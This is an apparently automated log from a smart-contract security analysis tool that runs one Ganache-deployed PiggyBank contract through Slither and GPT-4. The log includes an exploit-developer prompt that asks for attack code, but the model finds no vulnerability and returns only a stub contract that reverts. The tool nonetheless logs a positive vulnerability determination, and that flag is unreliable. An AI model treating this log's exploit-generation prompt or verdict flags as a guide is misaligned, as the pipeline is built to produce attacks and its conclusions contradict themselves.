2025-06-22 21:10:32,008 - app.services.contract_service - WARNING - No contracts compiled
2025-06-22 21:10:32,010 - app.services.contract_service - INFO - Temporary file /tmp/tmpj1ggjma0.sol removed
2025-06-22 21:10:32,012 - app.api.contract - WARNING - No valid Solidity contract found in the provided code
2025-06-22 21:10:32,014 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-22 21:10:32,016 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-22 21:10:32,018 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-22 21:10:32,020 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-22 21:10:32,023 - werkzeug - INFO - 192.168.176.1 - - [22/Jun/2025 21:10:32] "[31m[1mPOST /analyze HTTP/1.1[0m" 400 -
2025-06-22 21:10:55,483 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-22 21:10:55,501 - app.api.contract - INFO - Analyzing code snippet
2025-06-22 21:10:55,521 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-22 21:10:55,526 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmp3lict916.sol
2025-06-22 21:10:55,542 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-06-22 21:10:55,544 - app.services.contract_service - INFO - Compiling contract...
2025-06-22 21:10:55,730 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-06-22 21:10:56,677 - solcx - INFO - Using solc version 0.8.0
2025-06-22 21:10:56,679 - solcx - INFO - solc 0.8.0 successfully installed at: /root/.solcx/solc-v0.8.0
2025-06-22 21:10:56,684 - solcx - INFO - Using solc version 0.8.0
2025-06-22 21:10:57,691 - app.services.contract_service - INFO - Compilation result: 1 contracts compiled
2025-06-22 21:10:57,695 - app.services.contract_service - INFO - Deploying 1 contracts...
2025-06-22 21:10:58,264 - app.services.contract_service - INFO - Contract PiggyBank deployed at 0x5b1869D9A4C187F2EAa108f3062412ecf0526b24
2025-06-22 21:10:58,266 - app.services.contract_service - INFO - Setting up contract PiggyBank...
2025-06-22 21:10:58,486 - app.services.contract_service - INFO - Contract PiggyBank setup completed
2025-06-22 21:10:58,488 - app.services.contract_service - INFO - Funding contract PiggyBank for attack testing...
2025-06-22 21:10:58,940 - app.services.contract_service - INFO - Contract PiggyBank funded
2025-06-22 21:10:58,943 - app.services.contract_service - INFO - Building contract observation...
2025-06-22 21:10:59,212 - app.services.contract_service - INFO - Contract observation built successfully
2025-06-22 21:10:59,213 - app.services.contract_service - INFO - Generating attack strategy...
2025-06-22 21:10:59,214 - app.services.contract_service - INFO - Running Slither analysis...
2025-06-22 21:10:59,227 - app.services.contract_service - WARNING - Failed to run Slither analysis: solc-select non trouv√© : installe-le via pip install solc-select
2025-06-22 21:10:59,249 - app.services.contract_service - WARNING - Traceback (most recent call last):
  File "/app/modules/slither_scan.py", line 38, in ensure_solc_version
    subprocess.run(
  File "/usr/local/lib/python3.12/subprocess.py", line 548, in run
    with Popen(*popenargs, **kwargs) as process:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/local/lib/python3.12/subprocess.py", line 1955, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'solc-select'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/app/services/contract_service.py", line 192, in analyze_contract_from_code
    slith_result = slither_analyze(temp_path)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 152, in slither_analyze
    slither_result = run_slither(sol_path, json_path, solc_version)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 69, in run_slither
    ensure_solc_version(solc_version)
  File "/app/modules/slither_scan.py", line 44, in ensure_solc_version
    raise EnvironmentError("solc-select non trouv√© : installe-le via pip install solc-select")
OSError: solc-select non trouv√© : installe-le via pip install solc-select

2025-06-22 21:10:59,251 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-06-22 21:10:59,253 - app.modules.attack_generator - INFO - Contract name: PiggyBank
2025-06-22 21:10:59,254 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-06-22 21:10:59,255 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-06-22 21:10:59,259 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-22 21:10:59,261 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-22 21:10:59,263 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-22 21:11:11,873 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-22 21:11:11,900 - app.modules.attack_generator - INFO - Received response from OpenAI API in 12.64 seconds
2025-06-22 21:11:11,906 - app.modules.attack_generator - INFO - Contract analysis completed in 12.64 seconds
2025-06-22 21:11:11,907 - app.modules.attack_generator - INFO - Vulnerability assessment: **

- **Reentrancy:** No reentrancy vulnerability here. The contract uses `transfer()`, which forwar...
2025-06-22 21:11:11,909 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-06-22 21:11:11,910 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-22 21:11:11,911 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-22 21:11:11,912 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-22 21:11:13,063 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-22 21:11:13,084 - app.modules.attack_generator - INFO - Received response from OpenAI API in 1.17 seconds
2025-06-22 21:11:13,092 - app.modules.attack_generator - INFO - Attack code generation completed in 1.17 seconds
2025-06-22 21:11:13,095 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 158
2025-06-22 21:11:13,097 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 13.81 seconds
2025-06-22 21:11:13,099 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-06-22 21:11:13,103 - app.services.contract_service - INFO - Attack strategy generated successfully: {'analysis': {'analysis_prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmp3lict916.sol",\n  "contracts": [\n    {\n      "contract_name": "PiggyBank",\n      "address": "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24",\n      "abi": [\n        {\n          "inputs": [],\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "inputs": [],\n          "name": "getBalance",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "withdraw",\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "stateMutability": "payable",\n          "type": "receive"\n        }\n      ],\n      "functions": [\n        {\n          "name": "getBalance",\n          "signature": "getBalance()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "withdraw",\n          "signature": "withdraw()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24": 3000000000000000000,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99990294720000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999578900000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 3000000000000000000,\n        "_contract_eth_balance_eth": 3.0,\n        "getBalance": 3000000000000000000,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract PiggyBank {\\n    address public owner;\\n\\n    constructor() {\\n        owner = msg.sender;\\n    }\\n\\n    receive() external payable {}\\n\\n    function withdraw() external {\\n        require(msg.sender == owner, \\"Not the owner\\");\\n        payable(owner).transfer(address(this).balance);\\n    }\\n\\n    function getBalance() external view returns (uint) {\\n        return address(this).balance;\\n    }\\n}",\n      "solc_version": "0.8.0"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'analysis_raw_response': '1. **Contract Analysis:**\n\n- Contract Name: PiggyBank  \n- Solidity Version: pragma solidity ^0.8.0  \n- The contract holds ETH and allows deposits via the `receive()` function.  \n- It stores an `owner` address set at deployment (constructor sets `owner = msg.sender`).  \n- The `withdraw()` function allows the owner to withdraw the entire contract balance.  \n- The `getBalance()` function returns the current ETH balance of the contract.  \n\n2. **Vulnerability Assessment:**\n\n- **Reentrancy:** No reentrancy vulnerability here. The contract uses `transfer()`, which forwards only 2300 gas and reverts on failure, preventing reentrancy.  \n- **Access Control:** The `withdraw()` function correctly restricts access to the owner via `require(msg.sender == owner)`. No public or external function allows unauthorized withdrawal.  \n- **Denial of Service (DoS):** Using `transfer()` can cause DoS if the owner is a contract with a fallback function that uses more than 2300 gas or reverts. However, this is a known tradeoff and generally safe for EOAs.  \n- **Logic Bugs:** No logic bugs detected. The contract is minimal and straightforward.  \n- **Math Errors:** No math operations are performed that could overflow or underflow.  \n- **Unsafe Calls:** The only external call is `payable(owner).transfer(...)`, which is safe under Solidity 0.8.0 and the gas stipend model.  \n- **Backdoors:** None detected.  \n- **Economic Exploits:** None detected. The contract simply holds ETH and allows the owner to withdraw all funds.  \n\n3. **Exploitation Requirements:**\n\n- No exploitable vulnerabilities found.  \n- To withdraw funds, an attacker would need to be the owner address (0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1).  \n- No setup or special conditions enable unauthorized access or fund theft.  \n\n---\n\n**Summary:**  \nThe `PiggyBank` contract is a simple ETH holding contract with owner-only withdrawal. It uses Solidity 0.8.0 and is free from reentrancy, permission, or logic vulnerabilities. The only risk is the potential DoS if the owner is a contract that rejects `transfer()`, but this is a known limitation of using `transfer()` and not a security vulnerability per se.', 'contract_analysis': '**\n\n- Contract Name: PiggyBank  \n- Solidity Version: pragma solidity ^0.8.0  \n- The contract holds ETH and allows deposits via the `receive()` function.  \n- It stores an `owner` address set at deployment (constructor sets `owner = msg.sender`).  \n- The `withdraw()` function allows the owner to withdraw the entire contract balance.  \n- The `getBalance()` function returns the current ETH balance of the contract.  \n\n2. **', 'vulnerability_assessment': '**\n\n- **Reentrancy:** No reentrancy vulnerability here. The contract uses `transfer()`, which forwards only 2300 gas and reverts on failure, preventing reentrancy.  \n- **Access Control:** The `withdraw()` function correctly restricts access to the owner via `require(msg.sender == owner)`. No public or external function allows unauthorized withdrawal.  \n- **Denial of Service (DoS):** Using `transfer()` can cause DoS if the owner is a contract with a fallback function that uses more than 2300 gas or reverts. However, this is a known tradeoff and generally safe for EOAs.  \n- **Logic Bugs:** No logic bugs detected. The contract is minimal and straightforward.  \n- **Math Errors:** No math operations are performed that could overflow or underflow.  \n- **Unsafe Calls:** The only external call is `payable(owner).transfer(...)`, which is safe under Solidity 0.8.0 and the gas stipend model.  \n- **Backdoors:** None detected.  \n- **Economic Exploits:** None detected. The contract simply holds ETH and allows the owner to withdraw all funds.  \n\n3. **', 'exploitation_requirements': '**\n\n- No exploitable vulnerabilities found.  \n- To withdraw funds, an attacker would need to be the owner address (0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1).  \n- No setup or special conditions enable unauthorized access or fund theft.', 'analysis_duration': 12.639752388000488}, 'attack': {'attack_prompt': "\nYou are a Solidity exploit developer. Based on the security analysis, create ONLY executable Solidity attack code.\n\nSecurity Analysis:\n\nContract Analysis: **\n\n- Contract Name: PiggyBank  \n- Solidity Version: pragma solidity ^0.8.0  \n- The contract holds ETH and allows deposits via the `receive()` function.  \n- It stores an `owner` address set at deployment (constructor sets `owner = msg.sender`).  \n- The `withdraw()` function allows the owner to withdraw the entire contract balance.  \n- The `getBalance()` function returns the current ETH balance of the contract.  \n\n2. **\n\nVulnerability Assessment: **\n\n- **Reentrancy:** No reentrancy vulnerability here. The contract uses `transfer()`, which forwards only 2300 gas and reverts on failure, preventing reentrancy.  \n- **Access Control:** The `withdraw()` function correctly restricts access to the owner via `require(msg.sender == owner)`. No public or external function allows unauthorized withdrawal.  \n- **Denial of Service (DoS):** Using `transfer()` can cause DoS if the owner is a contract with a fallback function that uses more than 2300 gas or reverts. However, this is a known tradeoff and generally safe for EOAs.  \n- **Logic Bugs:** No logic bugs detected. The contract is minimal and straightforward.  \n- **Math Errors:** No math operations are performed that could overflow or underflow.  \n- **Unsafe Calls:** The only external call is `payable(owner).transfer(...)`, which is safe under Solidity 0.8.0 and the gas stipend model.  \n- **Backdoors:** None detected.  \n- **Economic Exploits:** None detected. The contract simply holds ETH and allows the owner to withdraw all funds.  \n\n3. **\n\nExploitation Requirements: **\n\n- No exploitable vulnerabilities found.  \n- To withdraw funds, an attacker would need to be the owner address (0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1).  \n- No setup or special conditions enable unauthorized access or fund theft.\n\n\nTarget Contract Address: 0x5b1869D9A4C187F2EAa108f3062412ecf0526b24\n\nRequirements:\n- Generate ONLY complete, compilable Solidity code\n- Include pragma solidity version \n- Create a contract that can be deployed and executed\n- Ensure to use the same solidity version as the target contract and respect the syntax rules for this version\n- Include an attack function (named 'attack', 'exploit', or 'run')\n- The constructor should take the target contract address as parameter\n- Focus on exploiting the identified vulnerabilities\n- NO explanations, NO comments, ONLY CODE\nReturn format: Pure Solidity code in ```solidity code blocks.\n```pragma solidity 0.8.0\n", 'attack_raw_response': '```solidity\npragma solidity 0.8.0;\n\ncontract Attack {\n    constructor(address) {}\n\n    function attack() external payable {\n        revert("No exploit possible");\n    }\n}\n```', 'code': 'pragma solidity 0.8.0;\n\ncontract Attack {\n    constructor(address) {}\n\n    function attack() external payable {\n        revert("No exploit possible");\n    }\n}', 'code_type': 'solidity', 'attack_duration': 1.1726300716400146}, 'prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmp3lict916.sol",\n  "contracts": [\n    {\n      "contract_name": "PiggyBank",\n      "address": "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24",\n      "abi": [\n        {\n          "inputs": [],\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "inputs": [],\n          "name": "getBalance",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "withdraw",\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "stateMutability": "payable",\n          "type": "receive"\n        }\n      ],\n      "functions": [\n        {\n          "name": "getBalance",\n          "signature": "getBalance()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "withdraw",\n          "signature": "withdraw()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24": 3000000000000000000,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99990294720000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999578900000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 3000000000000000000,\n        "_contract_eth_balance_eth": 3.0,\n        "getBalance": 3000000000000000000,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract PiggyBank {\\n    address public owner;\\n\\n    constructor() {\\n        owner = msg.sender;\\n    }\\n\\n    receive() external payable {}\\n\\n    function withdraw() external {\\n        require(msg.sender == owner, \\"Not the owner\\");\\n        payable(owner).transfer(address(this).balance);\\n    }\\n\\n    function getBalance() external view returns (uint) {\\n        return address(this).balance;\\n    }\\n}",\n      "solc_version": "0.8.0"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'raw_response': '1. **Contract Analysis:**\n\n- Contract Name: PiggyBank  \n- Solidity Version: pragma solidity ^0.8.0  \n- The contract holds ETH and allows deposits via the `receive()` function.  \n- It stores an `owner` address set at deployment (constructor sets `owner = msg.sender`).  \n- The `withdraw()` function allows the owner to withdraw the entire contract balance.  \n- The `getBalance()` function returns the current ETH balance of the contract.  \n\n2. **Vulnerability Assessment:**\n\n- **Reentrancy:** No reentrancy vulnerability here. The contract uses `transfer()`, which forwards only 2300 gas and reverts on failure, preventing reentrancy.  \n- **Access Control:** The `withdraw()` function correctly restricts access to the owner via `require(msg.sender == owner)`. No public or external function allows unauthorized withdrawal.  \n- **Denial of Service (DoS):** Using `transfer()` can cause DoS if the owner is a contract with a fallback function that uses more than 2300 gas or reverts. However, this is a known tradeoff and generally safe for EOAs.  \n- **Logic Bugs:** No logic bugs detected. The contract is minimal and straightforward.  \n- **Math Errors:** No math operations are performed that could overflow or underflow.  \n- **Unsafe Calls:** The only external call is `payable(owner).transfer(...)`, which is safe under Solidity 0.8.0 and the gas stipend model.  \n- **Backdoors:** None detected.  \n- **Economic Exploits:** None detected. The contract simply holds ETH and allows the owner to withdraw all funds.  \n\n3. **Exploitation Requirements:**\n\n- No exploitable vulnerabilities found.  \n- To withdraw funds, an attacker would need to be the owner address (0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1).  \n- No setup or special conditions enable unauthorized access or fund theft.  \n\n---\n\n**Summary:**  \nThe `PiggyBank` contract is a simple ETH holding contract with owner-only withdrawal. It uses Solidity 0.8.0 and is free from reentrancy, permission, or logic vulnerabilities. The only risk is the potential DoS if the owner is a contract that rejects `transfer()`, but this is a known limitation of using `transfer()` and not a security vulnerability per se.', 'reasoning': '**\n\n- Contract Name: PiggyBank  \n- Solidity Version: pragma solidity ^0.8.0  \n- The contract holds ETH and allows deposits via the `receive()` function.  \n- It stores an `owner` address set at deployment (constructor sets `owner = msg.sender`).  \n- The `withdraw()` function allows the owner to withdraw the entire contract balance.  \n- The `getBalance()` function returns the current ETH balance of the contract.  \n\n2. **', 'summary': '**\n\n- **Reentrancy:** No reentrancy vulnerability here. The contract uses `transfer()`, which forwards only 2300 gas and reverts on failure, preventing reentrancy.  \n- **Access Control:** The `withdraw()` function correctly restricts access to the owner via `require(msg.sender == owner)`. No public or external function allows unauthorized withdrawal.  \n- **Denial of Service (DoS):** Using `transfer()` can cause DoS if the owner is a contract with a fallback function that uses more than 2300 gas or reverts. However, this is a known tradeoff and generally safe for EOAs.  \n- **Logic Bugs:** No logic bugs detected. The contract is minimal and straightforward.  \n- **Math Errors:** No math operations are performed that could overflow or underflow.  \n- **Unsafe Calls:** The only external call is `payable(owner).transfer(...)`, which is safe under Solidity 0.8.0 and the gas stipend model.  \n- **Backdoors:** None detected.  \n- **Economic Exploits:** None detected. The contract simply holds ETH and allows the owner to withdraw all funds.  \n\n3. **', 'code': 'pragma solidity 0.8.0;\n\ncontract Attack {\n    constructor(address) {}\n\n    function attack() external payable {\n        revert("No exploit possible");\n    }\n}', 'code_type': 'solidity', 'duration': 13.812382459640503}
2025-06-22 21:11:13,108 - app.services.contract_service - INFO - Has exploit code: True
2025-06-22 21:11:13,109 - app.services.contract_service - INFO - No vulnerabilities mentioned: False
2025-06-22 21:11:13,111 - app.services.contract_service - INFO - Final vulnerability determination: True
2025-06-22 21:11:13,112 - app.services.contract_service - INFO - Attack strategy summary: **

- **Reentrancy:** No reentrancy vulnerability here. The contract uses `transfer()`, which forwards only 2300 gas and reverts on failure, preventing reentrancy.  
- **Access Control:** The `withdraw()` function correctly restricts access to the owner via `require(msg.sender == owner)`. No public or external function allows unauthorized withdrawal.  
- **Denial of Service (DoS):** Using `transfer()` can cause DoS if the owner is a contract with a fallback function that uses more than 2300 gas or reverts. However, this is a known tradeoff and generally safe for EOAs.  
- **Logic Bugs:** No logic bugs detected. The contract is minimal and straightforward.  
- **Math Errors:** No math operations are performed that could overflow or underflow.  
- **Unsafe Calls:** The only external call is `payable(owner).transfer(...)`, which is safe under Solidity 0.8.0 and the gas stipend model.  
- **Backdoors:** None detected.  
- **Economic Exploits:** None detected. The contract simply holds ETH and allows the owner to withdraw all funds.  

3. **
2025-06-22 21:11:13,114 - app.services.contract_service - INFO - Analysis completed with status: KO
2025-06-22 21:11:13,116 - app.services.contract_service - INFO - Temporary file /tmp/tmp3lict916.sol removed
2025-06-22 21:11:13,165 - app.api.contract - INFO - Report saved with filename: PiggyBank_2025-06-22_21-11, status: KO
2025-06-22 21:11:13,167 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-22 21:11:13,169 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-22 21:11:13,170 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-22 21:11:13,171 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-22 21:11:13,173 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-22 21:11:13,175 - werkzeug - INFO - 192.168.176.1 - - [22/Jun/2025 21:11:13] "POST /analyze HTTP/1.1" 200 -
2025-06-22 21:11:13,196 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-22 21:11:13,198 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-22 21:11:13,199 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-22 21:11:13,200 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-22 21:11:13,202 - werkzeug - INFO - 192.168.176.1 - - [22/Jun/2025 21:11:13] "OPTIONS /history HTTP/1.1" 200 -
2025-06-22 21:11:13,246 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-22 21:11:13,248 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
